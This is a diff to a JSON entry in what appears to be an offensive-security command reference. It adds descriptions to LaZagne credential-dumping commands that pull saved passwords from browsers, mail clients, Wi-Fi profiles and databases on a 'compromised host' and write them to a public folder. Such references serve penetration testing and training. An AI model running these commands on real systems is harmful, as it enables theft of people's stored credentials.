@@ -175,11 +175,13 @@
   "variations": [
     {
       "label": "Only browsers",
-      "command": ".\\lazagne.exe browsers"
+      "command": ".\\lazagne.exe browsers",
+      "description": "Runs LaZagne to extract stored passwords from web browsers. Recovers saved credentials from Chrome, Firefox, Edge, and other browsers on the target."
     },
     {
       "label": "Write to file",
-      "command": ".\\lazagne.exe all -oN -output C:\\Users\\Public"
+      "command": ".\\lazagne.exe all -oN -output C:\\Users\\Public",
+      "description": "Runs LaZagne to extract stored credentials from all supported applications. Harvests passwords from browsers, email clients, databases, sysadmin tools, and WiFi profiles on the compromised host."
     }
   ],
   "explain": "Recovers locally stored application passwords in one run:\n  .\\lazagne.exe all        run every module (browsers, mail clients, Wi-Fi, RDP, databases, and more)\nEach module reads its app's own credential store in the current user's context; use browsers to scope it, or -oN -output to write results to a file."
